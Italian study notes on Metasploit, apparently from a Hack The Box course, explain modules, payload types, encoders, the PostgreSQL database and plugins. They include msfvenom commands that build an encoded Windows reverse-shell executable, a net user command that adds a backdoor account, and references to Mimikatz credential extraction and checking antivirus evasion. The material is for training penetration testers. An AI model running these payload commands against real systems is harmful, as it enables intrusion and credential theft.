# Table of Contents

- [Introduction to Metasploit](#introduction-to-metasploit)
  - [Architettura](#architettura)
    - [Data, Documentation, Lib](#data-documentation-lib)
    - [Modules](#modules-1)
    - [Plugins](#plugins)
    - [Scripts](#scripts)
    - [Tools](#tools)
- [Introduction to MSFconsole](#introduction-to-msfconsole)
  - [Launching](#launching)
  - [Installing msf](#installing-msf)
  - [MSF engagement structure](#msf-engagement-structure)
- [Modules](#modules)
- [Targets](#targets)
- [Payloads](#payloads)

# Introduction to Metasploit
Metasploit è una piattaforma modulare basata su Ruby per il penetration testing. Fornisce un ambiente completo per scansionare vulnerabilità, eseguire exploit già testati (proof-of-concept), inviare payload ed evadere i sistemi di rilevamento.

Edizioni: Framework vs Pro

Metasploit Framework: La versione gratuita, incentrata sulla riga di comando (CLI).

Metasploit Pro: La versione commerciale con funzionalità aggiuntive come interfaccia grafica (GUI), Task Chains, integrazione con Nexpose, procedure guidate (Wizards) e strumenti per l'Ingegneria Sociale.

La Console (msfconsole) è l'interfaccia principale, più completa e stabile del Framework.

Caratteristiche chiave: Supporto al completamento automatico (tasto Tab), esecuzione di comandi di sistema esterni e gestione centralizzata di sessioni di attacco (simili a schede di un browser) e job.

## Architettura 
Architettura del File System (/usr/share/metasploit-framework)
I file principali del framework sono organizzati in sottocartelle specifiche:

### Data, Documentation, Lib
omponenti fondamentali per il funzionamento di msfconsole e la documentazione tecnica.

### Modules
modules/: Contiene gli exploit e gli strumenti divisi per categoria:
- auxiliary, encoders, evasion, exploits, nops, payloads, post.


### Plugins
plugins/: Estensioni caricabili manualmente o automaticamente per aggiungere funzionalità (es. integrazione con Nessus, Sqlmap, OpenVAS).

### Scripts
scripts/: Contiene script utili e funzionalità legate a Meterpreter.

### Tools
tools/: Utility da riga di comando richiamabili direttamente da msfconsole (es. per la gestione di payload, password e riconiscenza).

# Introduction to MSFconsole
### Launching
crirom00@htb[/htb]$ msfconsole (oppure -q senza il banner)

### Installing msf
crirom00@htb[/htb]$ sudo apt update && sudo apt install metasploit-framework

## MSF engagement structure
- Enumeration
- Preparation
- Exploitation
- Privilege Escalation
- Post-Exploitation
![msf](./img/msf.png)

# Modules
Come menzionato in precedenza, i moduli di Metasploit sono script pronti con uno scopo specifico e già stati sviluppati e testati sul campo. La categoria degli exploit è composta da cosiddetti proof-of-concept (PoC) che possono essere utilizzati per sfruttare le vulnerabilità esistenti in modo automatizzato. Molte persone pensano erroneamente che il fallimento di un exploit smentisca l'esistenza di una certa vulnerabilità. Tuttavia, ciò prova soltanto che l'exploit di Metasploit non ha funzionato, non che la vulnerabilità non esista. 

Ogni modulo è strutturato in cartelle con questa sintassi: <No.> \<type>/\<os>/\<service>/\<name>, es: exploit/windows/ftp/scriptftp_list.

- No.: viene visualizzato per selezionare l'exploit desiderato in seguito alle ricerche.
- Type: è il primo livello di separazione tra i moduli di Metasploit. Osservando questo campo, possiamo capire cosa farà il codice di quel modulo. Alcuni di questi tipi non sono direttamente utilizzabili come lo sarebbe un modulo exploit, ad esempio. Tuttavia, sono pensati per strutturare l'ambiente insieme a quelli interattivi per una migliore modularizzazione.Type che possono comparire in questo livello:
- type: 

    - auxiliary: fuzzing, sniffing e funzionalità amministrative. Offrono supporto e funzionalità extra.
    - Encoders: assicurano che i payload arrivino integri a destinazione (offuscando/codificando il codice).
    - Exploits:  moduli che sfruttano una vulnerabilità per permettere la consegna di un payload.
    - NOPs(No Operation code): mantengono le dimensioni dei payload coerenti tra i vari tentativi di exploit.
    - Payloads: codice che viene eseguito da remoto e richiama la macchina dell'attaccante per stabilire una connessione (o shell).
    - Plugins: script aggiuntivi che possono essere integrati in una valutazione con msfconsole e coesistere.
    - Post: collezione di moduli per raccogliere informazioni dopo la compromissione, muoversi lateralmente (pivot), ecc. 
    
    Quando si seleziona un modulo da utilizzare per la consegna del payload, il comando use <No.> può essere utilizzato solo con i moduli inziatori: Auxiliary, Post, Exploits
    
- OS: specifica per quale sistema operativo e architettura è stato creato il modulo.
- Service: si riferisce al servizio vulnerabile in esecuzione sulla macchina target. Per alcuni moduli (come quelli auxiliary o post), questo tag può riferirsi a un'attività più generale come gather, riferito ad esempio alla raccolta di credenziali.
- Name: spiega l'azione effettiva che può essere eseguita utilizzando quel modulo creato per uno scopo specifico.

è presente l'opzione setg, che specifica le opzioni da noi selezionate come permanenti fino al riavvio del programma.

# Targets
Molti exploit (specialmente quelli basati su buffer overflow o vulnerabilità di memoria) non funzionano "a occhi chiusi" su qualsiasi macchina. Un exploit ha bisogno di conoscere l'architettura esatta della memoria del sistema operativo target per poter deviare il flusso di esecuzione del programma verso il codice malevolo (payload).

Selezionare il target corretto configura automaticamente gli indirizzi di memoria giusti (come i puntatori di registro) necessari affinché il codice di exploit vada a buon fine anziché mandare in crash la macchina.

1. Perché l'Indirizzo di Ritorno (Return Address) varia così tanto?
Ogni aggiornamento di Windows o di un programma sposta le funzioni e le librerie DLL in posizioni di memoria diverse.
Lingua del sistema operativo: Una versione italiana di Windows XP ha DLL (es. kernel32.dll) caricate a indirizzi di memoria diversi rispetto alla versione inglese o giapponese.
jmp esp / pop / pop ret: Sono istruzioni Assembly usate per reindirizzare l'esecuzione del processore verso lo stack, dove l'attaccante ha posizionato la propria shell. Se l'indirizzo di memoria di queste istruzioni è errato di anche solo un byte, l'exploit fallisce.

2. Il comando info in msfconsole
Eseguire info dentro un modulo non mostra solo la descrizione della vulnerabilità, ma fornisce dettagli critici come: autori, opzioni obbligatorie, artefatti che lo script potrebbe lascaire sul target,etc.

3. Cos'è msfpescan?
È una utility integrata nella suite di Metasploit usata durante lo sviluppo o il tuning manuale di un exploit. Analizza file binari Windows (PE - Executable / DLL) per cercare sequenze di istruzioni Assembly utili (come jmp esp) da usare come return address per adattare l'exploit a un altro tipo di sw.

# Payloads

Un Payload in Metasploit si riferisce a un modulo che supporta il modulo di exploit (tipicamente) restituendo una shell all'attaccante. I payload vengono inviati insieme all'exploit stesso per bypassare le normali procedure di funzionamento del servizio vulnerabile (compito dell'exploit) e poi essere eseguiti sul sistema operativo target per restituire una connessione inversa all'attaccante e stabilire un punto d'accesso / foothold (compito del payload).

Esistono tre diversi tipi di moduli payload nel Framework Metasploit: Singles, Stagers, e Stages. Utilizzare tre tipologie di interazione per i payload si rivela vantaggioso per il pentester, in quanto offre la flessibilità necessaria per eseguire determinati tipi di compiti. Il fatto che un payload sia frazionato (staged) oppure no è rappresentato dal carattere / nel nome del payload stesso.

Ad esempio, windows/shell_bind_tcp è un payload single (Inline) senza stage, mentre windows/shell/bind_tcp è composto da uno stager (bind_tcp) e da uno stage (shell).

Singles (Payload Inline / Singoli)
Un payload Single contiene l'exploit e l'intero shellcode per il compito selezionato. I payload inline sono per natura più stabili delle loro controparti perché contengono tutto in un unico blocco. Tuttavia, alcuni exploit non supportano le dimensioni di questi payload, poiché possono diventare piuttosto grandi. I Singles sono payload autonomi: sono l'unico oggetto inviato ed eseguito sul sistema target, fornendo un risultato immediatamente dopo l'esecuzione. Un payload Single può essere semplice quanto aggiungere un utente sul sistema target o avviare un processo.

Stagers
I payload Stager lavorano insieme ai payload Stage per eseguire un compito specifico. Uno stager viene eseguito sulla macchina vittima e avvia una connessione in uscita verso il listener dell'attaccante, stabilendo il canale di comunicazione attraverso il quale verrà successivamente consegnato il payload stage. Gli stager sono tipicamente progettati per essere piccoli e affidabili. Metasploit selezionerà automaticamente lo stager più appropriato per un dato scenario, ripiegando su uno meno preferito quando necessario.

Stagers Windows NX vs. NO-NX

Problemi di affidabilità per le CPU con NX e con la protezione DEP (Data Execution Prevention).

Gli stager NX sono più grandi (usano VirtualAlloc in memoria).

La configurazione predefinita ora è compatibile con NX + Windows 7.

Stages
Gli Stage sono componenti del payload che vengono scaricati dai moduli Stager. I vari payload Stage offrono funzionalità avanzate senza limiti di dimensione, come Meterpreter, VNC Injection e altri. Gli stage del payload utilizzano automaticamente uno stager intermedio (middle stager):

Una singola chiamata recv() fallisce con payload di grandi dimensioni.

Lo Stager riceve lo stager intermedio (middle stager).

Lo stager intermedio esegue quindi il download completo.

Migliore gestione delle regioni di memoria con permessi RWX (Read-Write-Execute).

Staged Payloads (Payload Frazionati)
Un staged payload è, semplicemente, un processo di exploitation modularizzato e separato funzionalmente per aiutare a dividere le diverse funzioni che esegue in blocchi di codice distinti, ciascuno dei quali completa il proprio obiettivo individualmente ma lavorando in catena per portare a termine l'attacco. Questo garantirà infine all'attaccante l'accesso remoto alla macchina target se tutti gli stage funzionano correttamente.

Lo scopo di questo payload (come di qualsiasi altro), oltre a concedere l'accesso shell al sistema target, è essere il più compatto e discreto possibile per facilitare l'evasione dei sistemi Antivirus (AV) e di Prevenzione delle Intrusioni (IPS).

Lo Stage0 di un payload frazionato rappresenta lo shellcode iniziale inviato attraverso la rete al servizio vulnerabile della macchina target, il cui unico scopo è inizializzare una connessione verso la macchina dell'attaccante (connessione reverse). Come utenti di Metasploit li troveremo sotto i nomi comuni di reverse_tcp, reverse_https e bind_tcp.

1. Perché le Reverse Connection funzionano meglio delle Bind Shell?
Bind Shell (Connessione in entrata): L'exploit apre una porta in ascolto sulla macchina vittima e l'attaccante si connette a quella porta.

Problema: I firewall perimetrali bloccano quasi sempre il traffico in entrata sconosciuto verso porte non autorizzate (es. bloccano le connessioni esterne verso la porta 4444 della vittima).

Reverse Shell (Connessione in uscita): L'exploit fa in modo che sia la vittima a connettersi verso l'IP dell'attaccante.

Vantaggio: La maggior parte delle reti aziendali permette il traffico in uscita verso Internet (es. sulla porta 80, 443 o 53). Il firewall ritiene che si tratti di un normale client che naviga sul Web e fa passare la connessione.

2. Perché Meterpreter è così potente? (In-Memory / Fileless)
Meterpreter è la shell d'attacco standard di Metasploit e si distingue per le seguenti caratteristiche:

Iniezione in Memoria (Reflective DLL Injection):

Non scrive nessun file eseguibile (.exe) sul disco della vittima.

Si inietta direttamente nello spazio di memoria di un processo già esistente e legittimo (ad esempio svchost.exe o explorer.exe).

Risultato: Gli antivirus tradizionali basati sull'analisi dei file su disco non rilevano nulla (attacco fileless).

Comunicazione Cifrata e Modulare:

La comunicazione tra il client Meterpreter e l'attaccante avviene tramite canali cifrati (es. reverse_https).

I plugin (come Mimikatz per l'estrazione delle password dalla memoria LSASS) vengono caricati al volo direttamente in RAM senza toccare il disco.

3. Integrazione con Mimikatz (kiwi)
Il testo cita il plugin Mimikatz di GentilKiwi. In Metasploit, una volta ottenuta una sessione Meterpreter con privilegi elevati (SYSTEM/Administrator), è possibile digitare:

meterpreter > load kiwi

Spiegazione e Analisi dei Tipi di Payload
1. La distinzione cruciale nella sintassi: shell_reverse_tcp vs shell/reverse_tcp
Nota la differenza fondamentale tra queste due righe della tabella:

windows/x64/shell_reverse_tcp (con il carattere _):

È un payload Single / Inline.

Contiene l'intero shellcode in un unico blocco.

Utile quando non ci sono restrizioni stringenti sulle dimensioni della memoria vulnerabile e si desidera la massima stabilità senza scaricare fasi successive via rete.

windows/x64/shell/reverse_tcp (con lo slash /):

È un payload Staged.

Lo Stage0 (stager) si connette alla macchina dell'attaccante e scarica lo Stage1 (il codice della shell) direttamente in RAM.

Indispensabile quando il buffer sfruttabile nell'exploit è molto piccolo.

2. I Payload Specializzati
windows/x64/exec:
Non apre una shell interattiva, ma esegue un singolo comando di sistema (ad esempio cmd.exe /c net user attacker Password123! /add per aggiungere un utente). Molto utile nei PoC per dimostrare la vulnerabilità senza lasciare sessioni aperte.

windows/x64/vncinject/$:
Utilizza la Reflective DLL Injection per caricare un server VNC direttamente nella memoria del processo target senza installare nulla su disco. Permette all'attaccante di vedere e controllare il desktop grafico della vittima in tempo reale.

windows/x64/powershell/$:
Avvia una sessione PowerShell nativa anziché il classico cmd.exe. Questo consente di eseguire direttamente script avanzati e cmdlets nell'ambiente Windows target.

3. Strumenti avanzati C2: Empire e Cobalt Strike
Il testo menziona due framework fondamentali utilizzati nel Red Teaming professionale oltre a Metasploit:

Cobalt Strike: Il framework C2 (Command and Control) standard del settore per simulazioni di attacchi avanzati (APT). I suoi payload si chiamano Beacons, progettati per integrarsi nel traffico di rete legittimo (HTTP/HTTPS/DNS) e con capacità evasive avanzate contro ED/AV.

PowerShell Empire: Un framework C2 basato su agenti in PowerShell e Python, ampiamente usato per la fase di post-exploitation, movimento laterale ed estrazione di credenziali in ambienti Active Directory.

# Encoders 
1. Cosa sono i "Bad Characters"?
Quando si sfrutta una vulnerabilità di memoria (come un Buffer Overflow), lo shellcode viene iniettato tramite funzioni di stringa del programma target (es. strcpy, gets).

Certi byte o caratteri esadecimali speciali interrompono la lettura del buffer da parte del programma.

Il classico esempio è il Null Byte (\x00), che in linguaggio C rappresenta il carattere di fine stringa (Null Terminator). Se lo shellcode contiene \x00, la funzione C interromperà la lettura dello shellcode prima della fine, rompendo l'exploit.

Altri caratteri problematici possono essere \x0a (Line Feed) o \x0d (Carriage Return).

Il ruolo dell'Encoder: Prende lo shellcode originale con i bad characters e lo cifra/codifica trasformandolo in una sequenza di byte priva di qualsiasi carattere vietato. All'inizio del payload aggiunge un piccolo blocco di codice chiamato Stub di Decodifica (Decoder Stub) che, una volta eseguito in memoria RAM, ricompone lo shellcode originale prima di avviarlo.

2. Perché "Shikata Ga Nai [SGN](https://hatching.io/blog/metasploit-payloads2/)" non funziona più contro gli Antivirus moderni?
shikata_ga_nai è un encoder polimorfico ad additivo polimorfico XOR: ad ogni codifica genera un payload con una struttura grafica/binaria totalmente diversa.

In passato: Gli antivirus controllavano le firme statiche dei file su disco. Cambiare i byte del payload tramite SGN bastava a far fallire la corrispondenza con le firme degli antivirus.

Oggi: Gli antivirus moderni e gli EDR (Endpoint Detection and Response) utilizzano l'analisi euristica, gli ambienti di Sandbox / Esecuzione simulata e l'analisi comportamentale in memoria. Quando l'AV vede un programma eseguire un Decoder Stub che decifra codice dinamico in memoria RAM e tenta di eseguirlo, lo blocca immediatamente, indipendentemente dal fatto che sia stato usata la codifica SGN.


## Selecting an encoder
- Vecchio metodo (prima del 2015)(msfpayload+msfencoder)
  - msfpayload windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 R | msfencode -e x86/shikata_ga_nai -b '\x00' -f exe > payload.exe
  - Oggi entrambi i comandi sono stati deprecati e sostituiti da un unico strumento consolidato chiamato msfvenom:

- Metodo moderno unico (-e encoding tecnique)
  - msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -f exe -o payload.exe

- con il comando show encoders dopo aver scelto un payload dentro msfconsole

- in alternativa metasploit offre un tool msf-virustotal  che si puo usare con una api key per analizzare il payload e vedere quale av lo rileva.

# Database

Per quale motivo si usa il Database in msfconsole?

Durante un penetration testing (specialmente su reti ampie), gestire manualmente la mole di risultati (IP, porte aperte, vulnerabilità, credenziali e hash) diventa caotico. Metasploit si integra nativamente con PostgreSQL per:

Organizzare e memorizzare automaticamente le informazioni scoperte.

Importare ed esportare dati da/verso strumenti esterni (es. Nmap, Nessus).

Popolare automaticamente i parametri dei moduli di exploit (es. RHOSTS) dai risultati registrati.

Configurazione del Database
Avvio di PostgreSQL:

sudo systemctl start postgresql
Inizializzazione del DB di Metasploit:

sudo msfdb init
(Crea l'utente msf, il database, la configurazione in database.yml e gli schemi iniziali).

Avvio integrato:
Per avviare la console direttamente connessa al database si usa:

sudo msfdb run --> msf6 >
Comandi di verifica e ripristino:

db_status: Verifica se la connessione a PostgreSQL è attiva.

msfdb reinit: Resetta il database in caso di problemi di autenticazione o aggiornamenti.

msf6 > help database

msf6 > workspace -h

Gestione dei Progetti con i Workspaces
I Workspaces funzionano come cartelle di progetto isolate per separare i dati di target, reti o clienti diversi.

workspace: Mostra il workspace attuale (quello attivo ha un asterisco *).

workspace -a \<nome>: Crea e seleziona un nuovo workspace.

workspace \<nome>: Cambia il workspace attivo.

workspace -d \<nome>: Elimina un workspace.

Importazione ed Esecuzione Scansioni
Importazione file esterni (db_import): Permette di caricare i risultati di Nmap (preferibilmente in formato .xml).

crirom00@htb[/htb]$ cat Target.nmap

msf6 > db_import Target.xml

Scansione diretta da console (db_nmap): Esegue Nmap direttamente dentro msfconsole e salva automaticamente i risultati nel DB.

msf6 > db_nmap -sV -sS 10.10.10.8
Comandi Principali di Interrogazione e Gestione
hosts: Mostra la tabella degli host scoperti (IP, MAC, OS, commenti). Con l'opzione -R imposta automaticamente la variabile RHOSTS per i moduli.

msf6 > services -h: Elenca tutti i servizi e le porte aperte trovate sui vari host.

msf6 > creds -h: Tabella per visualizzare, filtrare o aggiungere manualmente credenziali scoperte (password in chiaro, hash NTLM, chiavi SSH, hash Postgres/MD5).

msf6 > loot -h: Gestisce i file e le informazioni sensibili estratte dai sistemi compromessi (es. dump di file passwd/shadow, file di configurazione).

db_export: Esporta il contenuto del workspace corrente per il backup (in formato .xml o .pwdump).

Plaintext
msf6 > db_export -f xml backup.xml

# Plugins

1. Cosa sono i Plugin in Metasploit?
I Plugin sono software pronti all'uso rilasciati da terze parti (aziende con versioni Community/Free o singoli sviluppatori) e integrati nel framework.

Interazione con l'API: I plugin lavorano a diretto contatto con l'API di Metasploit e permettono di manipolare l'intero framework, automatizzare compiti ripetitivi ed estendere i comandi della console.

Documentazione Automatica: A differenza del passato (dove occorreva esportare e importare manualmente i dati tra diversi software), i plugin salvano automaticamente tutti i risultati nel database di Metasploit (host, servizi, vulnerabilità).

2. Gestione e Utilizzo dei Plugin
Directory predefinita: Tutti i file dei plugin (con estensione .rb) si trovano nella cartella:

Plaintext
/usr/share/metasploit-framework/plugins
Caricamento in console: Si usa il comando load <nome_plugin> dentro msfconsole.

Esempio: load nessus attiva il bridge per Nessus e aggiunge comandi specifici (es. nessus_help, nessus_connect, nessus_policy_list).

Se il plugin non esiste nella cartella, la console restituisce un errore di caricamento del file .rb.

3. Installazione di Nuovi Plugin Personalizzati
Mentre molti plugin vengono aggiornati automaticamente dal repository della distribuzione (es. Parrot OS), è possibile installare manualmente plugin personalizzati:

Scaricare o clonare il repository del plugin (es. git clone [https://github.com/darkoperator/Metasploit-Plugins](https://github.com/darkoperator/Metasploit-Plugins)).

Copiare il file .rb desiderato (es. pentest.rb) nella cartella dei plugin:

Bash
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/
Avviare msfconsole e caricare il plugin con load pentest.

Il comando help di msfconsole mostrerà automaticamente le nuove categorie di comandi aggiunte (es. Tradecraft, auto_exploit, Discovery, Project, Postauto).

4. Plugin Popolari (Pre-installati e Terze Parti)
Il testo cita diversi plugin di ampio utilizzo nel penetration testing:

Pre-installati: nMap, NexPose, Nessus, Mimikatz (V.1), Stdapi, Incognito.

Aggiuntivi / Terze parti: Railgun, Priv, Darkoperator's (Pentest).

5. Architettura Interna: I Mixin in Ruby
Definizione: Metasploit è scritto in Ruby (linguaggio orientato agli oggetti). I Mixin sono classi che mettono i propri metodi a disposizione di altre classi senza ricorrere all'ereditarietà classica (si parla di inclusione anziché ereditarietà).

Implementazione: In Ruby si implementano usando la parola chiave include seguita dal nome del modulo.

Scopo: Servono a fornire funzionalità opzionali a una classe o a condividere una specifica funzione tra moltissime classi diverse, garantendo una personalizzazione profonda del framework.